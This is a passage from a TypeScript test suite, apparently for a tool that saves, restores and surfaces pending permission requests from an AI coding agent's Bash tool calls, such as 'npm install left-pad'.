    p.storeMap.set(ASKS_STORE_KEY, { ...saved, at: NOW })
    p.clock.now = NOW + MIRROR_FRESH_MS + 1
    await restoreAsks(p)
    expect(openAsks()).toEqual([])
    expect(p.logs.some(l => l.includes("saved by a process that's gone"))).toBe(true)
  })

  test('the tick saves the mirror as it writes a row (WP-EC), then every 10 s while an ask is open', async () => {
    await feed(ask('a1', 'Bash', 'make'))
    expect(mirrored()!.at).toBe(NOW)
    p.clock.now = NOW + 4_000
    await asksTick(p)
    expect(mirrored()!.at).toBe(NOW + 4_000)
    p.clock.now = NOW + 8_000
    await asksTick(p)
    expect(mirrored()!.at).toBe(NOW + 4_000)
    p.clock.now = NOW + 14_000
    await asksTick(p)
    expect(mirrored()!.at).toBe(NOW + 14_000)
  })
})

describe('through the real drain', () => {
  test("guard.sh's call start, then ask.sh's line, in one spool file: one paired ask, and its row at the tick", async () => {
    mkdirSync(spoolDir(dir), { recursive: true })
    const lines = [start('a1', 'Bash', 'toolu_1', 'npm install left-pad'), ask('a1', 'Bash', 'npm install left-pad')]
    writeFileSync(spoolPath(dir, SESSION), `${lines.map(l => JSON.stringify(l)).join('\n')}\n`)
    expect(await drainSpool(ctx, [consumeAsks])).toEqual({ lines: 2, bad: 0 })
    expect(only()).toEqual(expect.objectContaining({ toolUseId: 'toolu_1', detail: 'npm install left-pad' }))
    expect(p.notes).toEqual([])
    await asksTick(p)
    expect(p.notes).toEqual(['⚑ asking · executor wants Bash: npm install left-pad · authorized: writes in the checkout'])
  })
})
